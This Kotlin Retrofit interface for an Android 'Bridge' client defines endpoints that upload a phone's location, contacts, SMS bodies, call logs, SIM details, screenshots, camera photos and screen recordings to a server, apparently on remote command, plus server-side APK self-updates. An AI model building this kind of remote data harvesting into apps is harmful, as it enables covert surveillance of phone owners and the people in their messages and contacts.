package my.bridge.com.core.network.api

import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.http.Body
import retrofit2.http.GET
import retrofit2.http.Header
import retrofit2.http.Multipart
import retrofit2.http.POST
import retrofit2.http.Part
import retrofit2.http.Path
import retrofit2.http.Query
import retrofit2.http.Streaming

/**
 * Bridge 后端 REST 接口（Retrofit）。
 *
 * 客户端对接的 REST 能力（管理侧接口不在此列）：
 *   - 设备注册（POST /api/devices/register）→ device_id + token
 *   - 日志上传（POST /api/logs）→ code=0
 *   - 音乐下载（GET /api/music/{filename}）→ 音频二进制（play_music 裸文件名音源）
 *
 * 字段与后端 schemas/ws.py、schemas/logs.py 对齐。
 */
interface BridgeApi {

    /** 设备注册请求体。 */
    data class RegisterRequest(val device_id: String, val device_name: String? = null)

    /** 设备注册响应体。 */
    data class RegisterResponse(val device_id: String, val token: String)

    /** 日志上传请求体。 */
    data class LogUploadRequest(
        val device_id: String,
        val content: String,
        val device_name: String = "",
        val app_version: String = "",
    )

    /** 日志上传响应体。 */
    data class LogUploadResponse(val code: Int, val message: String, val device_id: String)

    /** 位置上报请求体（对应服务端 LocationReportRequest，get_location 持久化）。 */
    data class LocationReportRequest(
        val device_id: String,
        val latitude: Double,
        val longitude: Double,
        val accuracy: Double = 0.0,
        val provider: String = "",
        val altitude: Double? = null,
        val speed: Double? = null,
        val fix_time_ms: Long = 0L,
    )

    /** 位置上报响应体（action: merged=静止合并 / inserted=新建行）。 */
    data class LocationReportResponse(
        val action: String,
        val id: Long,
        val distance_m: Double? = null,
        val report_count: Int = 1,
    )

    /** 通讯录上报请求体（对应服务端 ContactsReportRequest，get_contacts 持久化）。 */
    data class ContactsReportRequest(val contacts: List<ContactItem>)

    /** 一个联系人（号码/邮箱为原始字符串列表）。 */
    data class ContactItem(
        val contact_key: String,
        val name: String,
        val phones: List<String>,
        val emails: List<String>,
    )

    /** 快照类上报响应体（通讯录/通话记录共用：total=入库条数）。 */
    data class SnapshotReportResponse(val total: Int, val sync_time: String = "")

    /** 短信上报请求体（对应服务端 SmsReportRequest，get_sms 持久化）。 */
    data class SmsReportRequest(val messages: List<SmsItem>)

    /** 一条短信（type: 1收件 2已发 3草稿 4发送中 5失败 6队列）。 */
    data class SmsItem(
        val sms_key: String,
        val address: String,
        val body: String,
        val type: Int,
        val date_ms: Long,
        val read: Boolean,
        val sim_slot: Int = -1,
        val sim_number: String = "",
    )

    /** 短信上报响应体。 */
    data class SmsReportResponse(val received: Int, val inserted: Int, val updated: Int)

    /** 通话记录上报请求体（对应服务端 CallLogReportRequest，get_call_log 持久化）。 */
    data class CallLogReportRequest(val records: List<CallLogItem>)

    /** 一条通话记录（type: 1呼入 2呼出 3未接 4语音信箱 5拒接 6已拦截）。 */
    data class CallLogItem(
        val call_key: String,
        val number: String,
        val name: String,
        val type: Int,
        val duration: Int,
        val date_ms: Long,
        val location: String,
        val sim_slot: Int = -1,
        val sim_number: String = "",
    )

    /** SIM 卡上报请求体（get_sim_info，按设备覆盖快照）。 */
    data class SimReportRequest(val sims: List<SimItem>)

    /** 一张 SIM 卡（slot_index: 0 基卡槽序号；carrier: 运营商名称）。 */
    data class SimItem(
        val slot_index: Int,
        val subscription_id: Int,
        val number: String,
        val carrier: String,
    )

    /** 媒体上传响应体（screenshot/take_photo/record_screen 成功后服务端返回）。 */
    data class MediaUploadResponse(
        val code: Int,
        val message: String,
        val id: Long = 0,
        val filename: String = "",
        val size: Long = 0,
    )

    /** 更新检查响应体（check_update；服务端扫描 updates 目录并比对版本）。 */
    data class LatestUpdateResponse(
        val found: Boolean,
        val available: Boolean = false,
        val current_version: String = "",
        val version: String = "",
        val filename: String = "",
        val size_bytes: Long = 0,
        /** 服务端现算的 APK md5（缓存命中判定 + 下载完整性校验；老服务端可能不返回）。 */
        val md5: String? = null,
        val notes: String = "",
    )

    /** 注册设备，返回 device_id + token。 */
    @POST("api/devices/register")
    suspend fun registerDevice(@Body body: RegisterRequest): RegisterResponse

    /** 上传诊断日志。 */
    @POST("api/logs")
    suspend fun uploadLog(@Body body: LogUploadRequest): LogUploadResponse

    /** 上报一次位置（get_location 成功后调用，设备鉴权头同音乐下载）。 */
    @POST("api/locations")
    suspend fun reportLocation(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Body body: LocationReportRequest,
    ): LocationReportResponse

    /** 上报通讯录快照（get_contacts，整体覆盖服务端该设备快照）。 */
    @POST("api/contacts")
    suspend fun reportContacts(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Body body: ContactsReportRequest,
    ): SnapshotReportResponse

    /** 上报一批短信（get_sms，服务端按 (device_id, sms_key) 去重）。 */
    @POST("api/sms")
    suspend fun reportSms(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Body body: SmsReportRequest,
    ): SmsReportResponse

    /** 上报通话记录快照（get_call_log，整体覆盖服务端该设备快照）。 */
    @POST("api/calllogs")
    suspend fun reportCallLogs(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Body body: CallLogReportRequest,
    ): SnapshotReportResponse

    /** 上报 SIM 卡信息快照（get_sim_info，整体覆盖该设备）。 */
    @POST("api/sims")
    suspend fun reportSims(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Body body: SimReportRequest,
    ): SnapshotReportResponse

    /**
     * 下载服务器共享目录里的音乐文件（404 = 服务器无此文件）。
     * 设备鉴权头：与 WS hello 同一套注册表校验（auth 关闭时服务端忽略）。
     */
    @Streaming
    @GET("api/music/{filename}")
    suspend fun downloadMusic(
        @Path("filename") filename: String,
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
    ): ResponseBody

    /**
     * 上传媒体文件（截屏 PNG / 拍照 JPEG / 录屏 MP4）。
     * kind 为表单文本字段（screenshot/photo/screen_record），file 为二进制分片。
     */
    @Multipart
    @POST("api/media")
    suspend fun uploadMedia(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Part("kind") kind: RequestBody,
        @Part file: MultipartBody.Part,
    ): MediaUploadResponse

    /** 检查更新（服务端扫描指定目录取最高版本并与 currentVersion 比对）。 */
    @GET("api/updates/latest")
    suspend fun getLatestUpdate(
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
        @Query("current_version") currentVersion: String,
    ): LatestUpdateResponse

    /**
     * 下载更新 APK（check_update 自动更新，服务器自身直链，不依赖 GitHub）。
     * 404 = 服务端 updates 目录无此文件；调用方负责关闭响应体并写盘。
     */
    @Streaming
    @GET("api/updates/{filename}")
    suspend fun downloadUpdate(
        @Path("filename") filename: String,
        @Header("X-Device-Id") deviceId: String,
        @Header("X-Device-Token") token: String?,
    ): ResponseBody
}
